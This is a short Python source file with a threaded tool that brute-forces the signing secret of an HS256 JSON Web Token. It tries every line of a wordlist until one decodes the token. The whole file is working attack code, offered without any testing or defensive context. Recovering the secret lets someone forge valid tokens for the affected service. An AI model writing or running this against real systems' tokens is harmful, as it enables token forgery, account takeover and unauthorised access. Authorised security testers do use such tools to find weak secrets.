import jwt
from concurrent.futures import ThreadPoolExecutor


class JWTCracker:
    def __init__(self, token, wordlist_path):
        self.token = token
        self.wordlist_path = wordlist_path

    def _try_secret(self, secret):
        try:
            jwt.decode(self.token, secret, algorithms=["HS256"])
            return secret
        except jwt.InvalidTokenError:
            return None

    def crack(self):
        with open(self.wordlist_path, "r") as f:
            secrets = f.read().splitlines()

        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(self._try_secret, secrets)

        for result in results:
            if result:
                return result
        return None
